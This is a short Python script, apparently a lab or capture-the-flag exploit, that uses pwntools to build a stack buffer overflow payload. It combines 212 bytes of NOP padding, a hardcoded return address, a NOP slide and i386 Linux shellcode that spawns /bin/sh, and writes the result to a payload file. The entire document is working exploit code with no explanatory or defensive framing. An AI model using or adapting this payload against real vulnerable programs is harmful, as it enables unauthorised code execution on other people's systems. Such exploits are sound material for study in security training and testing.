from pwn import *
fp = open("stack_shell_payload", "wb")

shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')

padding = b"\x90"*212

# Address of end of buffer + a little bit of leniency
addr = pack(0xffffd8ec  + 0xaa)

# Nop slide
nops = b"\x90"*0xff

fp.write(padding + addr + nops + shellcode)
fp.close()

